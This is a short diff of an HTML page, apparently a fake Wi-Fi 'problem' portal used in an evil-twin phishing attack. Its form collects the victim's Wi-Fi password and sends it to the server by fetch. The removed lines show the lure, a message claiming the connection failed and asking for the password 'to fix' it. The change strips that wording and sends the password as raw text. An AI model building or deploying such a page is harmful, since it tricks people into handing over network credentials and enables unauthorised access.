@@ -19,13 +19,12 @@
     </style>
 </head>
 <body>
-    <h2>Your Wi-Fi ran into a problem</h2>
+    <h2>Enter Wi-Fi Password</h2>
     <form id="wifiForm">
         <label for="wifi_pass">Wi-Fi Password:</label>
         <input type="password" id="wifi_pass" name="wifi_pass" required>
         <button type="submit">Submit</button>
     </form>
-    <h4>Enter you password, we are fixing this issue</h4>
 
     <script>
         document.getElementById("wifiForm").addEventListener("submit", function(event) {
@@ -34,8 +33,8 @@
 
             fetch("/submit", {
                 method: "POST",
-                headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: "wifi_pass=" + encodeURIComponent(wifiPassword)
+                headers: { "Content-Type": "text/plain" },
+                body: wifiPassword
             })
             .then(response => response.text())
             .then(data => alert(data));
